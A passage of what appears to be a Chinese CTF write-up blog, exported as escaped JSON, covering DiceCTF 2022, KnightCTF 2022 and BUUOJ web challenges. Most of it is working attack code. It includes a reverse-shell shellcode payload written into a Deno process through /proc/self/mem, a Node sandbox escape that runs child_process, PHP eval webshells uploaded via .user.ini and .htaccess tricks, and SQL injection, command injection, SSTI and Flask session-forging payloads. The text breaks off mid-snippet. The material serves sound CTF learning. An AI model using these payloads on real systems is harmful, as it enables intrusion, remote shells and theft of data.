href=\u0026#34;javascript:document.cookie = \u0026#39;lang=es\u0026#39;; location.reload();\u0026#34;\u0026gt;Español\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;hr /\u0026gt; \u0026lt;%= i18n.COMING_SOON %\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 注意到它用了include，如果让它包含其它的，就可以LFI了\n# 爆破pid import requests HOST = \u0026#34;https://denoblog-26b8ed381fd6c5f9.mc.ax\u0026#34; while True: for num in range(8, 15): for num2 in range(9,13): print(f\u0026#34;attempting: ../../../../../../../../proc/{num}/fd/{num2}\u0026#34;) try: r = requests.get(HOST, cookies={\u0026#34;lang\u0026#34;: f\u0026#34;../../../../../../../../proc/{num}/fd/{num2}\u0026#34;}) except: pass 但是如何rce呢？一转pwn势\n在dockerfile中有这样的权限设置\nRUN deno compile --allow-read --allow-write --allow-net app.ts RUN chmod 755 /app/app 写入/proc/self/mem，覆盖内存，调用JSON.stringify来触发代码\nNow, where to write is the question. I ran deno with gdb, and printed the address of Builtins_JsonStringify. This address was at a constant offset each time, so I just clobbered this region in memory with my own shellcode, then ran JSON.stringify() to trigger my code.\n(gdb) p Builtins_JsonStringify $4 = {\u0026lt;text variable, no debug info\u0026gt;} 0x281d340 \u0026lt;Builtins_JsonStringify\u0026gt; So, I created my shellcode, and injected into the deno process at the right section, then ran JSON.stringify() all through an ejs template included with a file descriptor. Doing all of this gets you the flag!\npayload\nimport requests import base64 HOST = \u0026#34;https://denoblog-26b8ed381fd6c5f9.mc.ax\u0026#34; IPADDR = \u0026#34;1.1.1.1\u0026#34; PORT = 12345 addr_hex = bytes.fromhex(\u0026#39;\u0026#39;.join([hex(int(n))[2:].zfill(2) for n in IPADDR.split(\u0026#34;.\u0026#34;)])) port_hex = bytes.fromhex(hex(PORT)[2:]) shellcode = \\ b\u0026#34;\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\u0026#34; + \\ b\u0026#34;\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0\u0026#34; + \\ b\u0026#34;\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\u0026#34; + \\ b\u0026#34;\\x02\u0026#34; + port_hex + b\u0026#34;\\xc7\\x44\\x24\\x04\u0026#34; + addr_hex + b\u0026#34;\\x48\\x89\\xe6\\x6a\\x10\u0026#34; + \\ b\u0026#34;\\x5a\\x41\\x50\\x5f\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\u0026#34; + \\ b\u0026#34;\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\u0026#34; + \\ b\u0026#34;\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\u0026#34; + \\ b\u0026#34;\\x5f\\x6a\\x3b\\x58\\x0f\\x05\u0026#34; payload = \u0026#34;\u0026#34;\u0026#34; \u0026lt;% let maps = await Deno.readTextFile(\u0026#39;/proc/self/maps\u0026#39;); let line = maps.split(\u0026#34;\\\\n\u0026#34;).find(l =\u0026gt; l.includes(\u0026#34;/app/app\u0026#34;) \u0026amp;\u0026amp; l.includes(\u0026#34;r-x\u0026#34;)); let base = parseInt(line.split(\u0026#34; \u0026#34;)[0].split(\u0026#34;-\u0026#34;)[0], 16); let mem = await Deno.open(\u0026#39;/proc/self/mem\u0026#39;, { write: true }); let offset = base + 0xd39340; console.log(\u0026#34;[pwn] Builtins_JsonStringify @ 0x\u0026#34; + (offset).toString(16)); await Deno.seek(mem.rid, offset, Deno.SeekMode.Start); let shellcode = `\u0026#34;\u0026#34;\u0026#34; + base64.b64encode(shellcode).decode() + \u0026#34;\u0026#34;\u0026#34;`; shellcode = atob(shellcode); shellcode = \u0026#34;\\\\x90\u0026#34;.repeat(512) + shellcode; let shellcode_arr = new Uint8Array(shellcode.length); for(let i = 0; i \u0026lt; shellcode.length; i++) { shellcode_arr[i] = shellcode.charCodeAt(i); } console.log(\u0026#34;[pwn] lets go~\u0026#34;); await Deno.write(mem.rid, shellcode_arr); JSON.stringify(\u0026#34;wtmoo\u0026#34;); %\u0026gt; \u0026#34;\u0026#34;\u0026#34; payload += \u0026#34;A\u0026#34;*1024*64 print(f\u0026#34;sending rev shell to {IPADDR}:{PORT}...\u0026#34;) while True: r = requests.get(HOST, data=payload) 还能说什么呢 牛逼\n————以上后面pwn的地方我直接复制的官方wp\nmisc/undefined I was writing some Javascript when everything became undefined\u0026hellip;\nCan you create something out of nothing and read the flag at /flag.txt? Tested for Node version 17.\nnc mc.ax 31131\nindex.js\n额，几乎把js所有乱七八糟的东西都整成undefined了\n但是import还可以动态引入（作者忽略了\nimport(\u0026#39;fs\u0026#39;).then(fs=\u0026gt;fs.readFile(\u0026#39;/flag.txt\u0026#39;,\u0026#39;utf-8\u0026#39;,(err,data)=\u0026gt;{console.log(data,err)})); 预期则是这样\n(function(){return arguments.callee.caller.arguments[1](\u0026#34;fs\u0026#34;).readFileSync(\u0026#34;/flag.txt\u0026#34;,\u0026#34;utf-8\u0026#34;)})() 随便一个函数，arguments.callee得到当前执行的函数，arguments.callee.caller得到调用它的函数，再通过arguments[1]获得到require这个参数，执行require(\u0026quot;fs\u0026quot;)以及后续操作\n————这里还有一个方法2：\n利用Node可以拿到structured Stack Trace的feature\nfunction CustomError() { const oldStackTrace = Error.prepareStackTrace try { Error.prepareStackTrace = (err, structuredStackTrace) =\u0026gt; structuredStackTrace Error.captureStackTrace(this) this.stack } finally { Error.prepareStackTrace = oldStackTrace } } function trigger() { const err = new CustomError() for (const x of err.stack) { console.log(x.getFunction()+\u0026#34;\u0026#34;) } } trigger() 我们可以用x.getFunction()拿到上层的function，就是Node在执行时加上的wrapper，再通过arguments得到fn.arguments[1]（也就是require\n放到题目中由于没有Error可以用，我们直接自制一个TypeError\ntry { null.f() } catch (e) { TypeError = e.constructor } Error = TypeError.prototype.__proto__.constructor 再利用TypeError是继承自Error的特性，就可以不依靠global拿到Error constructor了\n全payload\ntry { null.f() } catch (e) { TypeError = e.constructor } Object = {}.constructor String = \u0026#39;\u0026#39;.constructor Error = TypeError.prototype.__proto__.constructor function CustomError() { const oldStackTrace = Error.prepareStackTrace try { Error.prepareStackTrace = (err, structuredStackTrace) =\u0026gt; structuredStackTrace Error.captureStackTrace(this) this.stack } finally { Error.prepareStackTrace = oldStackTrace } } function trigger() { const err = new CustomError() console.log(err.stack[0]) for (const x of err.stack) { const fn = x.getFunction() console.log(String(fn).slice(0, 200)) console.log(fn?.arguments) console.log(\u0026#39;=\u0026#39;.repeat(40)) if ((args = fn?.arguments)?.length \u0026gt; 0) { req = args[1] console.log(req(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;id\u0026#39;).toString()) } } } trigger() // dice{who_needs_builtins_when_you_have_arguments} 人在家中坐，开学延期天上来\n不能继续摆了，我他妈学爆！！！！！！\n","date":"2022-02-17T00:00:24+08:00","permalink":"https://amiaaaz.github.io/2022/02/17/dicectf2022-wp/","section":"posts","tags":["wp"],"title":"diceCTF2022 Wp"},{"categories":["CTF"],"contents":"https://knightctf.com/challenges\nhttps://ctftime.org/event/1545/tasks/\n标-的两道题是脑子短路了，赛后出的\nSometime you need to look wayback https://github.com/KCTF202x/repo101/commits/main\nKCTF{version_control_is_awesome}\nDo Something Special http://do-something-special.kshackzone.com/\n页面按钮重定向至/gr@b_y#ur_fl@g_h3r3!，由于url的截断，#和后面的内容我们urlencode一下\nKCTF{Sp3cial_characters_need_t0_get_Url_enc0ded}\nObsfuscation Isn\u0026rsquo;t Enough 很长的jsfuck，控制台\nif (document.forms[0].username.value == \u0026#34;83fe2a837a4d4eec61bd47368d86afd6\u0026#34; \u0026amp;\u0026amp; document.forms[0].password.value == \u0026#34;a3fa67479e47116a4d6439120400b057\u0026#34;) document.location = \u0026#34;150484514b6eeb1d99da836d95f6671d.php\u0026#34; http://obsfication.kshackzone.com/150484514b6eeb1d99da836d95f6671d.php\nKCTF{0bfuscat3d_J4v4Scr1pt_aka_JSFuck}\n-Zero is not the limit 有user1到user5，没有user0\n然后没解出来，看wp就有点无语\n/user/-1 ……\nFind Pass Code - 1 页面提示/?source=1可看源码\n\u0026lt;?php require \u0026#34;flag.php\u0026#34;; if (isset($_POST[\u0026#34;pass_code\u0026#34;])) { if (strcmp($_POST[\u0026#34;pass_code\u0026#34;], $flag) == 0 ) { echo \u0026#34;KCTF Flag : {$flag}\u0026#34;; } else { echo \u0026#34;Oh....My....God. You entered the wrong pass code.\u0026lt;br\u0026gt;\u0026#34;; } } if (isset($_GET[\u0026#34;source\u0026#34;])) { print show_source(__FILE__); } ?\u0026gt; 用了strcmp，我们直接数组绕过\npass_code=KCTF KCTF{ShOuLd_We_UsE_sTrCmP_lIkE_tHaT}\nMost Secure Calculator readfile(\u0026#39;flag.txt\u0026#39;); KCTF{WaS_mY_cAlCuLaToR_sAfE}\nCan you be Admin? 典，请求头的题\nUser-Agent: KnightSquad Referer: localhost POST: username=tareq\u0026amp;password=IamKnight\u0026amp;submit=Login /dashboard.php User-Agent: KnightSquad Referer: localhost Cookie: VXNlcl9UeXBl=QWRtaW4= 更典的是总有模糊不清的提示\nKCTF{FiN4LlY_y0u_ar3_4dm1N}\nMy PHP Site /?file=文件包含点，php伪协议看页面源码\n\u0026lt;?php if(isset($_GET[\u0026#39;file\u0026#39;])){ if ($_GET[\u0026#39;file\u0026#39;] == \u0026#34;index.php\u0026#34;) { echo \u0026#34;\u0026lt;h1\u0026gt;ERROR!!\u0026lt;/h1\u0026gt;\u0026#34;; die(); }else{ include $_GET[\u0026#39;file\u0026#39;]; } }else{ echo \u0026#34;\u0026lt;h1\u0026gt;You are missing the file parameter\u0026lt;/h1\u0026gt;\u0026#34;; #note :- secret location /home/tareq/s3crEt_fl49.txt } ?\u0026gt; 直接包含s3crEt_fl49.txt就行，不用绝对路径\nKCTF{L0C4L_F1L3_1ncLu710n}\n-Bypass!! Bypass!! Bypass!! 页面源码提示/api/request/auth_token，post，得到token=nrpd935q5g77b0kr7iaiwi0aesa7m79xqu4n99hi，然后我尝试了很多get post参数，还有cookie，都不行\n看wp才知道这里应该使用X-Authorized-For请求头\nKCTF{cOngRatUlaT10Ns_wElCoMe_t0_y0ur_daShBoaRd}\nFind Pass Code - 2 跟之前一样的方式看源码/?source=1\n\u0026lt;?php require \u0026#34;flag.php\u0026#34;; $old_pass_codes = array(\u0026#34;0e215962017\u0026#34;, \u0026#34;0e730083352\u0026#34;, \u0026#34;0e807097110\u0026#34;, \u0026#34;0e840922711\u0026#34;); $old_pass_flag = false; if (isset($_POST[\u0026#34;pass_code\u0026#34;]) \u0026amp;\u0026amp; !is_array($_POST[\u0026#34;pass_code\u0026#34;])) { foreach ($old_pass_codes as $old_pass_code) { if ($_POST[\u0026#34;pass_code\u0026#34;] === $old_pass_code) { $old_pass_flag = true; break; } } if ($old_pass_flag) { echo \u0026#34;Sorry ! It\u0026#39;s an old pass code.\u0026#34;; } else if ($_POST[\u0026#34;pass_code\u0026#34;] == md5($_POST[\u0026#34;pass_code\u0026#34;])) { echo \u0026#34;KCTF Flag : {$flag}\u0026#34;; } else { echo \u0026#34;Oh....My....God. You entered the wrong pass code.\u0026lt;br\u0026gt;\u0026#34;; } } if (isset($_GET[\u0026#34;source\u0026#34;])) { print show_source(__FILE__); } ?\u0026gt; 典，0e绕过，0e1137126905\nKCTF{ShOuD_wE_cOmPaRe_MD5_LiKe_ThAt__Be_SmArT}\nMost Secure Calculator - 2 8进制，依旧是readfile('flag.txt')\n(\u0026#34;\\162\\145\\141\\144\\146\\151\\154\\145\u0026#34;)(\u0026#34;\\146\\154\\141\\147\\56\\164\\170\\164\u0026#34;) discord上还看到很多xor的payload，也很好\n(\u0026#34;538869\u0026#34;^\u0026#34;~4~2-~\u0026#34;^\u0026#34;8~5~~*\u0026#34;)((\u0026#34;378#\u0026#34;^\u0026#34;~(2,\u0026#34;^\u0026#34;.~~%\u0026#34;)) (\u0026#34;393480\u0026#34;^\u0026#34;@@@@]]\u0026#34;)((\u0026#34;8!4@80!8\u0026#34;^\u0026#34;[@@`^@_\u0026#34;).(\u0026#34;.\u0026#34;).(\u0026#34;484\u0026#34;^\u0026#34;@@@\u0026#34;)) ","date":"2022-01-24T17:47:53+08:00","permalink":"https://amiaaaz.github.io/2022/01/24/knightctf2022-wp/","section":"posts","tags":["wp"],"title":"KnightCTF2022 Wp"},{"categories":["LTS","CTF"],"contents":"因为前面做的很多由于时间关系遗忘了不少，趁着寒假来温故知新刷波题，这里就做个buuoj-web部分刷题的存档，应该都比较详细\n打星号的可能是因为环境问题复现不了，或者自己有地方没搞懂\n————前排食用注意：可展开的部分中是没有很好的md排版的（不做二级标题是不想左侧toc和整体页面太臃肿Orz.\npage 01 [极客大挑战 2019]EasySQL | sqli 弱口令 弱口令登入\nadmin'or 1#: 12345\n[HCTF 2018]WarmUp | mb_substr 查看页面源码提示source.php\n\u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; if (! isset($page) || !is_string($page)) { echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } } if (! empty($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; is_string($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; emmm::checkFile($_REQUEST[\u0026#39;file\u0026#39;]) ) { include $_REQUEST[\u0026#39;file\u0026#39;]; exit; } else { echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;img src=\\\u0026#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\u0026#34; /\u0026gt;\u0026#34;; } ?\u0026gt; mb_substr与substr用法一样\n所以我们在参数内多加一个?即可，但是要注意urlencode，代码中有一次decode，本身还有一次decode，所以要encode两次\npayload\n/source.php?file=hint.php%253F../../../../../ffffllllaaaagggg 参考：phpmyadmin4.8.1后台getshell\n同样的方式绕过waf登入数据库，创建名为一句话shell的表，包含对应路径的数据库文件得到shell\n[极客大挑战 2019]Havefun 页面源码\n$cat=$_GET[\u0026#39;cat\u0026#39;]; echo $cat; if($cat==\u0026#39;dog\u0026#39;){ echo \u0026#39;Syc{cat_cat_cat_cat}\u0026#39;; } payload\n/?cat=dog [ACTF2020 新生赛]Include | LFI 首页提示/?file=flag.php，文件包含点；尝试/etc/passwd，成功，/flag失败，尝试php伪协议\n/?file=php://filter/convert.base64-encode/resource=flag.php [强网杯 2019]随便注 | sqli 堆叠注入 1\u0026#39; 1\u0026#39; or \u0026#39;1 1\u0026#39; union select database()# 得到过滤条件\nreturn preg_match(\u0026#34;/select|update|delete|drop|insert|where|\\./i\u0026#34;,$inject); 使用堆叠注入\n1\u0026#39;;show tables;\t# 两个表 1919810931114514, words 1\u0026#39;;show columns from `1919810931114514`;\t# 含flag列 但只回显2列 1\u0026#39;;show columns from `words`;\t# 回显3列id+data 都是空的 把1919810931114514表改名为words，flag改为id，即可回显对应的data\n1\u0026#39;;alter table words rename to amiz;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# 1\u0026#39; or \u0026#39;1\t# 得到flag ————或者使用set\u0026amp;prepare from\u0026amp;execute的方式来堆叠\n1\u0026#39;;set @xx=concat(\u0026#39;se\u0026#39;,\u0026#39;lect * from `1919810931114514`;\u0026#39;);prepare x from @xx;execute x;# 回显过滤条件\nstrstr($inject, \u0026#34;set\u0026#34;) \u0026amp;\u0026amp; strstr($inject, \u0026#34;prepare\u0026#34;) 用大写绕过\n1\u0026#39;;Set @xx=concat(\u0026#39;se\u0026#39;,\u0026#39;lect * from `1919810931114514`;\u0026#39;);Prepare x from @xx;execute x;# [SUCTF 2019]EasySQL | sqli 堆叠注入 1;show tables;\t# Flag 1;show columns from Flag;\t# 被过滤 由于没有完整的报错首先猜一下后端语句，输入非0数字回显为1，其余为空，推测后端有||输出0的情况\nselect $_POST[\u0026#39;query\u0026#39;] || flag from Flag; payload\n*,1 # 相当于 select *,1 from Flag; ————或者使用堆叠，payload\n1;set sql_mode=PIPES_AS_CONCAT;select 1 将||转变为+一样的连接字符\nflag{4032c605-fa39-448d-aa2d-f35fca8d3fa9}\n[ACTF2020 新生赛]Exec | rce payload\n127.0.0.1;cat /flag flag{f8c12653-ce6e-4eef-8f69-9433506d5adc}\n[极客大挑战 2019]Secret File | LFI 页面源码提示/Archive_room.php，/end.php，/secr3t.php看到文件包含点，用伪协议\npayload\n/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php flag{7719d9f9-6f2f-46f7-bc78-a82cfc52d470}\n[极客大挑战 2019]LoveSQL | sqli 联合注入 万能密码登入，得到密码是bd798bc32e819b4f57d4e1523d5834c6\nadmin\u0026#39; union select 1,2,3#\t# 有3列 1\u0026#39; union select 1,database(),3#\t# 回显位在2和3上 库名geek 1\u0026#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();#\t# 表名geekuser, l0ve1ysq1 1\u0026#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;l0ve1ysq1\u0026#39;;#\t# id, username, password 1\u0026#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1# 注意group_concat()是个函数，憋手欠加空格\nflag{e210152f-fc19-4139-9d2a-dcbb6c4c6268}\n[GXYCTF2019]Ping Ping Ping | rce 空格绕过 127.0.0.1;ls\t# index.php, flag.php 127.0.0.1;cat flag.php\t# fxck your space! 127.0.0.1;cat$IFSindex.php\t# 空内容 127.0.0.1;cat$IFSflag.php\t# fxck your flag! 127.0.0.1;cat$IFS$7`ls`\t# 页面源码得到flag 127.0.0.1;a=g;cat$IFS$7fla$a.php\t# 页面源码得到flag flag{281616ef-7318-42b6-adaf-825edf76ff26}\n[极客大挑战 2019]Knife 白给shell，连蚁剑\nflag{95a76aa0-58b5-4494-bb49-7f11ce00774d}\n[极客大挑战 2019]Http | 请求头 页面源码提示/Secret.php，跟着提示一直修改请求头\nReferer: https://Sycsecret.buuoj.cn User-Agent: Syclover X-Forwarded-For: 127.0.0.1 flag{614f3098-1c0f-480b-97f7-9caa49025e83}\n[极客大挑战 2019]Upload | upload 过滤了几个常规的php后缀，用.php7绕过，同时抓包修改MIME为image/png\n之后发现它会检测上传内容有没有\u0026lt;?，用gif+phtml样式的🐎\npure.phtml\nGIF89a \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;eval($_POST[\u0026#39;amiz\u0026#39;]);\u0026lt;/script\u0026gt; 连蚁剑\nflag{23be575a-679e-4f7c-b75b-6e033d10bfca}\n[ACTF2020 新生赛]Upload | upload 前端限制后缀白名单jpg, png, gif，删审查元素会删不掉已经注册了的回调函数，所以直接改后缀名上传，然后抓包改一下\npure.html\nGIF89a \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;eval($_POST[\u0026#39;amiz\u0026#39;]);\u0026lt;/script\u0026gt; 连蚁剑\nflag{a8ff29f2-5197-4599-a1c4-1e8b5f390a8c}\n[RoarCTF 2019]Easy Calc | php-shell 页面源码：I\u0026rsquo;ve set up WAF to ensure security.\nnum参数以get方式传入，不允许有字母；绕过方式/calc.php ?num=xyx，加空格；还有chr()+ascii码\ntmp = str(input()) res = \u0026#39;\u0026#39; for _ in tmp: res += f\u0026#39;chr({str(ord(_))}).\u0026#39; print(res[:-1]) /calc.php? num=1;var_dump(scandir(chr(47)))\t# 爆目录文件 f1agg /calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) flag{4f1c0f5a-5a7b-4ad4-b7f4-9eb82de3f93f}\n[极客大挑战 2019]PHP 备份文件泄露/www.zip，flag.php中得到flag\nSyc{dog_dog_dog_dog}\n[极客大挑战 2019]BabySQL | sqli 联合注入 双写绕过 把union, select双写即可\nadmin\u0026#39; ununionion selselectect 1,2,3# 1\u0026#39; uunionnion sselectelect 1,2,group_concat(schema_name) ffromrom infoorrmation_schema.schemata%23\t# 库名information_schema,mysql,performance_schema,test,ctf,geek 1\u0026#39; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=\u0026#39;ctf\u0026#39;%23\t# 表名 Flag 1\u0026#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=\u0026#39;Flag\u0026#39;\t# 字段名flag 1\u0026#39; union select 1,2,group_concat(flag) from ctf.Flag\t# ctf库Flag表的flag字段 flag{b6848383-f7d0-4cad-ad7d-98ab54790bbe}\n可以写一个mini轮，用于sql语句双写（自己写的比较渣就不放了捏\n[ACTF2020 新生赛]BackupFile | 弱比较 /index.php.bak\n\u0026lt;?php include_once \u0026#34;flag.php\u0026#34;; if(isset($_GET[\u0026#39;key\u0026#39;])) { $key = $_GET[\u0026#39;key\u0026#39;]; if(!is_numeric($key)) { exit(\u0026#34;Just num!\u0026#34;); } $key = intval($key); $str = \u0026#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\u0026#34;; if($key == $str) { echo $flag; } } else { echo \u0026#34;Try to find out source file!\u0026#34;; } 看似比较复杂一点，但是if的比较是弱比较\npayload\n?key=123 flag{758691a1-017b-4033-899a-bd78281fbcc1}\n[护网杯 2018]easy_tornado | ssti /hint.txt：md5(cookie_secret+md5(filename))\n/flag.txt：/fllllllllllllag\n目标是找到cookie_secret，在报错页面发现可能的模板渲染\n/error?msg={{handler.settings}} 得到cookie_secret: 13b08673-9199-47bc-b5a2-bb7938591e62\n/file?filename=/fllllllllllllag\u0026amp;filehash=3725772b08f76e01024d81754c45f307 flag{5756e16a-885e-4009-83e1-653a4818a39a}\n[极客大挑战 2019]BuyFlag | is_numeric /pay.php，页面源码\n~~~post money and password~~~ if (isset($_POST[\u0026#39;password\u0026#39;])) { $password = $_POST[\u0026#39;password\u0026#39;]; if (is_numeric($password)) { echo \u0026#34;password can\u0026#39;t be number\u0026lt;/br\u0026gt;\u0026#34;; }elseif ($password == 404) { echo \u0026#34;Password Right!\u0026lt;/br\u0026gt;\u0026#34;; } } is_numeric函数用%20绕过\npassword=404%20\u0026amp;money[]=100000000 Cookie: user=1 flag{a3cd1620-d3f7-45a9-8b3d-ace1ed21e7fb}\n[HCTF 2018]admin | unicode欺骗 flask-session ————非预期：admin: 123弱口令\n————解法1：ᴬᴰᴹᴵᴺunicode欺骗，注册ᴬᴰᴹᴵᴺ: 456的号，改密为999，登入\n————解法2：看cookie是熟悉的flask-session，改密页面/change提示https://github.com/woadsl1234/hctf_flask/，拿到secret=\u0026lsquo;ckj123\u0026rsquo;\npython3 flask_session_cookie_manager3.py encode -s \u0026#39;ckj123\u0026#39; -t \u0026#34;{\u0026#39;_fresh\u0026#39;:True,\u0026#39;_id\u0026#39;: b\u0026#39;Yjg0OGY3OWU1MTI4ZWNhNWU1YWFlZWJiYzg5ZGM1NWNkZTIxYzlkNWJmZjI0YzhkMzljYWE1YzFlZTQ4OWEzY2EwYjlmNGYzODU4OTA1MTA0M2E3MWQ3ODM0M2JmY2IxNjI4MGQxOTQwNThmZDFmODg2ODFlZTdhOTQ1ZGQ0YWM=\u0026#39;,\u0026#39;csrf_token\u0026#39;: b\u0026#39;NGEwMDMxNmEyYzhlNzhkYWRiMTUwYjBiOWIwNGFmYzI1YTIxOTQzMg==\u0026#39;,\u0026#39;image\u0026#39;: b\u0026#39;eWl6eA==\u0026#39;,\u0026#39;name\u0026#39;:\u0026#39;amiz\u0026#39;,\u0026#39;user_id\u0026#39;:\u0026#39;10\u0026#39;}\u0026#34; flag{f479cd5d-4bc7-47a6-b6b2-be84ff250880}\n注意这个脚本加密的时候的内部都是单引号，并且没有多余的花括号\n[BJDCTF2020]Easy MD5 | sqli raw-md5永真 md5绕过 响应头有Hint: select * from \u0026lsquo;admin\u0026rsquo; where password=md5($pass,true)\nphp中md5的第二个参数为true时输出16字符二进制，默认false输出32字符十六进制，也就是说这里返回raw md5\nmysql中在进行布尔类型判断时，1开头的字符串会被当做int型\npassword=\u0026#39;xxx\u0026#39;or\u0026#39;1xxx\u0026#39; password=\u0026#39;xxx\u0026#39;or 1 password=\u0026#39;xxx\u0026#39;or\u0026#39;1\u0026#39; password=\u0026#39;xxx\u0026#39;or true\t# 以上三者均返回true password=\u0026#39;xxx\u0026#39;or\u0026#39;0trash\u0026#39;\t# false raw md5包含很多字符，如果raw md5包含'trash'or'1trash'这样的，就会true，永真\n一个参考payload是\nffifdyop hash: 276f722736c95d99e921722cf9ed621c 爆破脚本\n\u0026lt;?php for ($i = 0;;) { for ($c = 0; $c \u0026lt; 1000000; $c++, $i++) if (stripos(md5($i, true), \u0026#39;\\\u0026#39;or\\\u0026#39;\u0026#39;) !== false) echo \u0026#34;\\nmd5($i) = \u0026#34; . md5($i, true) . \u0026#34;\\n\u0026#34;; echo \u0026#34;.\u0026#34;; } ?\u0026gt; 参考：Leet More 2010 Oh Those Admins! writeup\n之后进入下一关，页面源码\n$a = $GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend. 数组绕过，payload\n/levels91.php?a[]=1\u0026amp;b[]=2 进入下一关\n\u0026lt;?php error_reporting(0); include \u0026#34;flag.php\u0026#34;; highlight_file(__FILE__); if($_POST[\u0026#39;param1\u0026#39;]!==$_POST[\u0026#39;param2\u0026#39;]\u0026amp;\u0026amp;md5($_POST[\u0026#39;param1\u0026#39;])===md5($_POST[\u0026#39;param2\u0026#39;])){ echo $flag; } 依旧数组绕过，注意post\n/levell14.php param1[]=1\u0026amp;param2[]=2 flag{78df171e-faa3-4c31-922f-a1f532e06dac}\n[ZJCTF 2019]NiZhuanSiWei | 反序列化 LFI \u0026lt;?php $text = $_GET[\u0026#34;text\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $password = $_GET[\u0026#34;password\u0026#34;]; if(isset($text)\u0026amp;\u0026amp;(file_get_contents($text,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the zjctf\u0026#34;)){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;h1\u0026gt;\u0026#34;.file_get_contents($text,\u0026#39;r\u0026#39;).\u0026#34;\u0026lt;/h1\u0026gt;\u0026lt;/br\u0026gt;\u0026#34;; if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ echo \u0026#34;Not now!\u0026#34;; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; } } else{ highlight_file(__FILE__); } ?\u0026gt; 指定了r，用data://伪协议\n/?text=data://text/plain,welcome to the zjctf\u0026amp;file=php://filter/convert.base64-encode/resource=useless.php \u0026lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;U R SO CLOSE !///COME ON PLZ\u0026#34;); } } } ?\u0026gt; 非常简单的反序列化\n$a = new Flag(); $a-\u0026gt;file = \u0026#39;flag.php\u0026#39;; echo serialize($a); payload\n/?text=data://text/plain,welcome to the zjctf\u0026amp;file=useless.php\u0026amp;password=O:4:\u0026#34;Flag\u0026#34;:1:{s:4:\u0026#34;file\u0026#34;;s:8:\u0026#34;flag.php\u0026#34;;} flag{0e255178-c131-4073-beb9-5821c29c0c3c}\n[SUCTF 2019]CheckIn | upload 传pure.phtml，对后缀检测，jpg会检测文件内容，考虑上传.user.ini\npure2.gif\nGIF89a \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;eval($_POST[\u0026#39;amiz\u0026#39;]);\u0026lt;/script\u0026gt; .user.ini\nGIF89a auto_prepend_file=pure2.gif uploads/cc551ab005b2e60fbdc88de809b2c4b1\n传的时候文件重名给远程环境整崩了，懒得重开了，寄\n[极客大挑战 2019]HardSQL | sqli 报错注入 之前几个分别用了万能密码，联合查询，双写，这次轮到报错注入了\n过滤了=，换成(a)like(b)这样的\n1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))%23\t# H4rDsq1 1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(\u0026#39;H4rDsq1\u0026#39;))),1))%23\t# id,username,password 1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))),1))%23 1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1))),1))%23 flag{64053c33-96f3-4bea-8e94-02fb81e48236}\n[MRCTF2020]你传你🐎呢 | upload 传.htaccess\n\u0026lt;FilesMatch \u0026#34;wuhu\u0026#34;\u0026gt; SetHandler application/x-httpd-php 